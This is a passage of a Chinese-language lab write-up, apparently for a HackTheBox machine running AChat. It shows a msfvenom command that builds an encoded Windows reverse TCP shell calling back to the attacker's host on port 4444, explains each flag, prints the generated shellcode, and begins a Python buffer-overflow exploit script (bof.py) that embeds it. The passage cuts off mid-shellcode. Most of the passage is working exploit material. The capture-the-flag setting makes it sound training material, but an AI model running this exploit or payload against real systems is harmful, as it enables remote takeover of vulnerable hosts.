+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>Shellcodes: No Results
+</code></pre></div>
+<p>Google寻找exp：https://github.com/mpgn/AChat-Reverse-TCP-Exploit</p>
+<p>但是这台靶机的exp不能够使用meterpreter，一进去就死掉，因此要做一些修改，生成payload：</p>
+<blockquote>
+<p>msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  RHOST=10.10.10.74 LHOST=10.10.16.3 LPORT=4444 exitfunc=thread -e x86/unicode_upper -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python  解释：</p>
+<p>-a x86 指定架构为 x86，即32位</p>
+<p>--platform Windows 指定目标平台为 Windows。</p>
+<p>-p 指定 payload 类型，这里使用的是 windows/shell_reverse_tcp，即一个反向 TCP shell。</p>
+<p>RHOST 指定目标主机的 IP 地址，即 10.10.10.74。</p>
+<p>LHOST 指定本地主机的 IP 地址，即 10.10.16.3。</p>
+<p>LPORT 指定本地监听的端口，即 4444。</p>
+<p>exitfunc 指定在 payload 执行完毕后使用 thread 方式退出，以保证 payload 能继续执行其他代码。</p>
+<p>-e 指定编码器，这里使用的是 x86/unicode_upper，用于编码 payload 以避开检测机制。</p>
+<p>-b 指定坏字符（bad characters），在编码时这些字符将被避免。这里指定了一长串的坏字符，包括从 \x00 到 \xff 中的所有非 ASCII 字符。</p>
+<p>BufferRegister 指定寄存器用于保存有效负载缓冲区地址，这里是 EAX。</p>
+<p>-f 指定输出格式，这里选择 python，即生成的 payload 将以 Python 代码形式输出。</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>┌──(root㉿kali)-[/home/tom/桌面]
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>└─# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp  RHOST=10.10.10.74 LHOST=10.10.16.3 LPORT=4444 exitfunc=thread -e x86/unicode_upper -b &#39;\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&#39; BufferRegister=EAX -f python
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>Found 1 compatible encoders
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Attempting to encode payload with 1 iterations of x86/unicode_upper
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>x86/unicode_upper succeeded with size 779 (iteration=0)
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>x86/unicode_upper chosen with final size 779
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Payload size: 779 bytes
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>Final size of python file: 3842 bytes
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>buf =  b&quot;&quot;
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>buf += b&quot;\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41&quot;
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>buf += b&quot;\x51\x41\x54\x41\x58\x41\x5a\x41\x50\x41\x33\x51&quot;
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>buf += b&quot;\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59&quot;
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>buf += b&quot;\x41\x49\x41\x51\x41\x49\x41\x51\x41\x50\x41\x35&quot;
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>buf += b&quot;\x41\x41\x41\x50\x41\x5a\x31\x41\x49\x31\x41\x49&quot;
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>buf += b&quot;\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41\x58&quot;
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>buf += b&quot;\x41\x35\x38\x41\x41\x50\x41\x5a\x41\x42\x41\x42&quot;
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>buf += b&quot;\x51\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31&quot;
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>buf += b&quot;\x31\x31\x31\x41\x49\x41\x4a\x51\x49\x31\x41\x59&quot;
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>buf += b&quot;\x41\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x33&quot;
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>buf += b&quot;\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b\x4c\x5a&quot;
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>buf += b&quot;\x48\x33\x52\x4b\x50\x4d\x30\x4d\x30\x53\x30\x54&quot;
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>buf += b&quot;\x49\x4a\x45\x4e\x51\x39\x30\x52\x44\x44\x4b\x42&quot;
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>buf += b&quot;\x30\x4e\x50\x44\x4b\x42\x32\x4c\x4c\x44\x4b\x51&quot;
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>buf += b&quot;\x42\x4c\x54\x34\x4b\x52\x52\x4f\x38\x4c\x4f\x57&quot;
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>buf += b&quot;\x47\x4f\x5a\x4d\x56\x4e\x51\x4b\x4f\x36\x4c\x4f&quot;
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>buf += b&quot;\x4c\x43\x31\x33\x4c\x4b\x52\x4e\x4c\x4f\x30\x37&quot;
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>buf += b&quot;\x51\x58\x4f\x4c\x4d\x4b\x51\x58\x47\x39\x52\x4b&quot;
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>buf += b&quot;\x42\x42\x32\x51\x47\x34\x4b\x51\x42\x4c\x50\x34&quot;
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>buf += b&quot;\x4b\x30\x4a\x4f\x4c\x54\x4b\x30\x4c\x4e\x31\x52&quot;
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>buf += b&quot;\x58\x39\x53\x30\x48\x4d\x31\x5a\x31\x52\x31\x54&quot;
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>buf += b&quot;\x4b\x52\x39\x4d\x50\x4d\x31\x49\x43\x44\x4b\x4f&quot;
+<a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>buf += b&quot;\x59\x4e\x38\x5a\x43\x4e\x5a\x51\x39\x54\x4b\x30&quot;
+<a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a>buf += b&quot;\x34\x34\x4b\x4b\x51\x39\x46\x30\x31\x4b\x4f\x36&quot;
+<a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a>buf += b&quot;\x4c\x47\x51\x48\x4f\x4c\x4d\x4b\x51\x57\x57\x50&quot;
+<a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>buf += b&quot;\x38\x4b\x30\x34\x35\x4b\x46\x4d\x33\x33\x4d\x4c&quot;
+<a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>buf += b&quot;\x38\x4f\x4b\x53\x4d\x4e\x44\x43\x45\x4b\x34\x31&quot;
+<a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>buf += b&quot;\x48\x34\x4b\x51\x48\x4f\x34\x4b\x51\x58\x53\x51&quot;
+<a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>buf += b&quot;\x56\x44\x4b\x4c\x4c\x30\x4b\x54\x4b\x51\x48\x4d&quot;
+<a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>buf += b&quot;\x4c\x4b\x51\x38\x53\x34\x4b\x4c\x44\x54\x4b\x4b&quot;
+<a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>buf += b&quot;\x51\x4a\x30\x53\x59\x50\x44\x4f\x34\x4f\x34\x31&quot;
+<a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a>buf += b&quot;\x4b\x31\x4b\x43\x31\x52\x39\x51\x4a\x32\x31\x4b&quot;
+<a id="__codelineno-2-42" name="__codelineno-2-42" href="#__codelineno-2-42"></a>buf += b&quot;\x4f\x49\x50\x31\x4f\x31\x4f\x30\x5a\x44\x4b\x4d&quot;
+<a id="__codelineno-2-43" name="__codelineno-2-43" href="#__codelineno-2-43"></a>buf += b&quot;\x42\x4a\x4b\x54\x4d\x51\x4d\x33\x38\x50\x33\x4e&quot;
+<a id="__codelineno-2-44" name="__codelineno-2-44" href="#__codelineno-2-44"></a>buf += b&quot;\x52\x4b\x50\x4d\x30\x52\x48\x34\x37\x52\x53\x50&quot;
+<a id="__codelineno-2-45" name="__codelineno-2-45" href="#__codelineno-2-45"></a>buf += b&quot;\x32\x51\x4f\x30\x54\x51\x58\x30\x4c\x44\x37\x4d&quot;
+<a id="__codelineno-2-46" name="__codelineno-2-46" href="#__codelineno-2-46"></a>buf += b&quot;\x56\x4c\x47\x4b\x4f\x59\x45\x56\x58\x46\x30\x4d&quot;
+<a id="__codelineno-2-47" name="__codelineno-2-47" href="#__codelineno-2-47"></a>buf += b&quot;\x31\x4d\x30\x4b\x50\x4e\x49\x59\x34\x30\x54\x32&quot;
+<a id="__codelineno-2-48" name="__codelineno-2-48" href="#__codelineno-2-48"></a>buf += b&quot;\x30\x32\x48\x4f\x39\x55\x30\x32\x4b\x4d\x30\x4b&quot;
+<a id="__codelineno-2-49" name="__codelineno-2-49" href="#__codelineno-2-49"></a>buf += b&quot;\x4f\x49\x45\x52\x30\x32\x30\x30\x50\x52\x30\x4f&quot;
+<a id="__codelineno-2-50" name="__codelineno-2-50" href="#__codelineno-2-50"></a>buf += b&quot;\x50\x50\x50\x4f\x50\x42\x30\x52\x48\x39\x5a\x4c&quot;
+<a id="__codelineno-2-51" name="__codelineno-2-51" href="#__codelineno-2-51"></a>buf += b&quot;\x4f\x59\x4f\x59\x50\x4b\x4f\x58\x55\x56\x37\x32&quot;
+<a id="__codelineno-2-52" name="__codelineno-2-52" href="#__codelineno-2-52"></a>buf += b&quot;\x4a\x4b\x55\x53\x38\x4b\x5a\x4b\x5a\x4c\x50\x4c&quot;
+<a id="__codelineno-2-53" name="__codelineno-2-53" href="#__codelineno-2-53"></a>buf += b&quot;\x43\x52\x48\x4b\x52\x4b\x50\x4e\x31\x51\x4c\x33&quot;
+<a id="__codelineno-2-54" name="__codelineno-2-54" href="#__codelineno-2-54"></a>buf += b&quot;\x59\x39\x56\x31\x5a\x4c\x50\x31\x46\x52\x37\x53&quot;
+<a id="__codelineno-2-55" name="__codelineno-2-55" href="#__codelineno-2-55"></a>buf += b&quot;\x38\x35\x49\x46\x45\x32\x54\x43\x31\x4b\x4f\x49&quot;
+<a id="__codelineno-2-56" name="__codelineno-2-56" href="#__codelineno-2-56"></a>buf += b&quot;\x45\x54\x45\x39\x30\x44\x34\x4c\x4c\x4b\x4f\x50&quot;
+<a id="__codelineno-2-57" name="__codelineno-2-57" href="#__codelineno-2-57"></a>buf += b&quot;\x4e\x4b\x58\x34\x35\x5a\x4c\x53\x38\x4c\x30\x57&quot;
+<a id="__codelineno-2-58" name="__codelineno-2-58" href="#__codelineno-2-58"></a>buf += b&quot;\x45\x56\x42\x51\x46\x4b\x4f\x5a\x35\x52\x48\x43&quot;
+<a id="__codelineno-2-59" name="__codelineno-2-59" href="#__codelineno-2-59"></a>buf += b&quot;\x33\x52\x4d\x53\x34\x4d\x30\x35\x39\x5a\x43\x52&quot;
+<a id="__codelineno-2-60" name="__codelineno-2-60" href="#__codelineno-2-60"></a>buf += b&quot;\x37\x52\x37\x51\x47\x50\x31\x4a\x56\x51\x5a\x4d&quot;
+<a id="__codelineno-2-61" name="__codelineno-2-61" href="#__codelineno-2-61"></a>buf += b&quot;\x42\x31\x49\x32\x36\x5a\x42\x4b\x4d\x32\x46\x57&quot;
+<a id="__codelineno-2-62" name="__codelineno-2-62" href="#__codelineno-2-62"></a>buf += b&quot;\x57\x51\x34\x4d\x54\x4f\x4c\x4b\x51\x4b\x51\x54&quot;
+<a id="__codelineno-2-63" name="__codelineno-2-63" href="#__codelineno-2-63"></a>buf += b&quot;\x4d\x50\x44\x4d\x54\x4c\x50\x39\x36\x4d\x30\x4f&quot;
+<a id="__codelineno-2-64" name="__codelineno-2-64" href="#__codelineno-2-64"></a>buf += b&quot;\x54\x52\x34\x50\x50\x42\x36\x30\x56\x30\x56\x50&quot;
+<a id="__codelineno-2-65" name="__codelineno-2-65" href="#__codelineno-2-65"></a>buf += b&quot;\x46\x32\x36\x50\x4e\x42\x36\x30\x56\x42\x33\x32&quot;
+<a id="__codelineno-2-66" name="__codelineno-2-66" href="#__codelineno-2-66"></a>buf += b&quot;\x36\x42\x48\x44\x39\x38\x4c\x4f\x4f\x33\x56\x4b&quot;
+<a id="__codelineno-2-67" name="__codelineno-2-67" href="#__codelineno-2-67"></a>buf += b&quot;\x4f\x5a\x35\x33\x59\x4b\x30\x30\x4e\x50\x56\x50&quot;
+<a id="__codelineno-2-68" name="__codelineno-2-68" href="#__codelineno-2-68"></a>buf += b&quot;\x46\x4b\x4f\x4e\x50\x43\x38\x4c\x48\x54\x47\x4d&quot;
+<a id="__codelineno-2-69" name="__codelineno-2-69" href="#__codelineno-2-69"></a>buf += b&quot;\x4d\x53\x30\x4b\x4f\x38\x55\x57\x4b\x4b\x30\x4d&quot;
+<a id="__codelineno-2-70" name="__codelineno-2-70" href="#__codelineno-2-70"></a>buf += b&quot;\x4d\x4d\x5a\x4c\x4a\x32\x48\x57\x36\x45\x45\x47&quot;
+<a id="__codelineno-2-71" name="__codelineno-2-71" href="#__codelineno-2-71"></a>buf += b&quot;\x4d\x45\x4d\x4b\x4f\x38\x55\x4f\x4c\x4d\x36\x53&quot;
+<a id="__codelineno-2-72" name="__codelineno-2-72" href="#__codelineno-2-72"></a>buf += b&quot;\x4c\x4b\x5a\x43\x50\x4b\x4b\x59\x50\x54\x35\x4d&quot;
+<a id="__codelineno-2-73" name="__codelineno-2-73" href="#__codelineno-2-73"></a>buf += b&quot;\x35\x47\x4b\x30\x47\x4e\x33\x32\x52\x32\x4f\x52&quot;
+<a id="__codelineno-2-74" name="__codelineno-2-74" href="#__codelineno-2-74"></a>buf += b&quot;\x4a\x4b\x50\x42\x33\x4b\x4f\x38\x55\x41\x41&quot;
+</code></pre></div>
+<p>bof.py：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="ch">#!/bin/usr/python</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="kn">import</span> <span class="nn">socket</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="k">class</span> <span class="nc">bcolours</span><span class="p">:</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>    <span class="n">GREEN</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[92m&#39;</span>
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>    <span class="n">TURQ</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[96m&#39;</span>
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>    <span class="n">ENDC</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[0m&#39;</span>
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="c1">#YOU WILL NEED TO PASTE THE OUTPUT FROM THE SHELL SCRIPT: &quot;ACHAT_PAYLOAD.SH&quot; BELOW:</span>
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&quot;&quot;</span>
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x54\x41\x58\x41\x5a\x41\x50\x55\x33\x51\x41\x44</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x51\x41\x49\x41\x51\x41\x50\x41\x35\x41\x41\x41\x50</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x5a\x31\x41\x49\x31\x41\x49\x41\x49\x41\x4a\x31</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\x41\x49\x41\x49\x41\x58\x41\x35\x38\x41\x41\x50</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x5a\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x49\x51\x49\x31\x31\x31\x31\x41\x49\x41\x4a\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x49\x31\x41\x59\x41\x5a\x42\x41\x42\x41\x42\x41\x42</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41\x42\x33\x30\x41\x50\x42\x39\x34\x34\x4a\x42\x4b</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4c\x5a\x48\x43\x52\x4d\x30\x4d\x30\x4d\x30\x31\x50</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x55\x39\x5a\x45\x30\x31\x37\x50\x43\x34\x34\x4b\x50</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x50\x4e\x50\x54\x4b\x52\x32\x4c\x4c\x34\x4b\x42\x32</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4e\x34\x34\x4b\x32\x52\x4f\x38\x4c\x4f\x37\x47\x50</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4a\x4d\x56\x4e\x51\x4b\x4f\x46\x4c\x4f\x4c\x31\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\x4c\x4c\x42\x4e\x4c\x4f\x30\x49\x31\x38\x4f\x4c</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4d\x4d\x31\x57\x57\x49\x52\x5a\x52\x30\x52\x42\x37</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x34\x4b\x42\x32\x4c\x50\x44\x4b\x30\x4a\x4f\x4c\x54</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\x30\x4c\x4c\x51\x54\x38\x5a\x43\x31\x38\x4b\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x5a\x31\x42\x31\x34\x4b\x50\x59\x4f\x30\x4b\x51\x5a</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\x54\x4b\x51\x39\x4c\x58\x4b\x33\x4f\x4a\x51\x39</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x34\x4b\x30\x34\x44\x4b\x4b\x51\x4a\x36\x30\x31\x4b</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4f\x36\x4c\x59\x31\x48\x4f\x4c\x4d\x4d\x31\x47\x57</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x30\x38\x49\x50\x54\x35\x4a\x56\x4d\x33\x43\x4d\x4a</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x58\x4f\x4b\x33\x4d\x4d\x54\x52\x55\x59\x54\x31\x48</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x54\x4b\x50\x58\x4f\x34\x4b\x51\x58\x53\x31\x56\x54</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4b\x4c\x4c\x30\x4b\x44\x4b\x42\x38\x4d\x4c\x4b\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-40" name="__codelineno-3-40" href="#__codelineno-3-40"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x59\x43\x54\x4b\x4d\x34\x44\x4b\x4b\x51\x58\x50\x44</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-41" name="__codelineno-3-41" href="#__codelineno-3-41"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x49\x31\x34\x4f\x34\x4e\x44\x51\x4b\x31\x4b\x33\x31</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-42" name="__codelineno-3-42" href="#__codelineno-3-42"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x52\x39\x51\x4a\x30\x51\x4b\x4f\x59\x50\x31\x4f\x51</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-43" name="__codelineno-3-43" href="#__codelineno-3-43"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x4f\x50\x5a\x44\x4b\x4e\x32\x5a\x4b\x34\x4d\x31\x4d</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-44" name="__codelineno-3-44" href="#__codelineno-3-44"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x31\x58\x50\x33\x30\x32\x4d\x30\x4b\x50\x33\x38\x52</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-45" name="__codelineno-3-45" href="#__codelineno-3-45"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x57\x44\x33\x4f\x42\x51\x4f\x51\x44\x42\x48\x50\x4c</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-46" name="__codelineno-3-46" href="#__codelineno-3-46"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x33\x47\x4f\x36\x4b\x57\x4b\x4f\x58\x55\x58\x38\x44</span><span class="s2">&quot;</span>
+<a id="__codelineno-3-47" name="__codelineno-3-47" href="#__codelineno-3-47"></a><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x50\x4b\x51\x4d\x30\x4d\x30\x4d\x59\x37\x54\x30\x54</span><span class="s2">&quot;</span>
